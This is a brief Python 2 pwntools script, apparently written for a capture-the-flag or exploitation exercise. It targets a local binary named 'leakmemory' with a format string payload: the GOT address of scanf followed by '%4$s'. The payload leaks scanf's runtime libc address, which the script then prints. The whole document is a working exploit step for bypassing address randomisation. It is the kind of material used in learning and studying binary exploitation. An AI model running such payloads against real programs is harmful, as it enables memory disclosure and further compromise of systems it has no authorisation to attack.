from pwn import *
p = process("./leakmemory")
elf = ELF("./leakmemory")
scanf_got = elf.got["__isoc99_scanf"]
payload = p32(scanf_got) + "%4$s"
#gdb.attach(p)
p.sendline(payload)
p.recvline()
scanf_addr = u32(p.recv(8)[4:8])
print hex(scanf_addr)
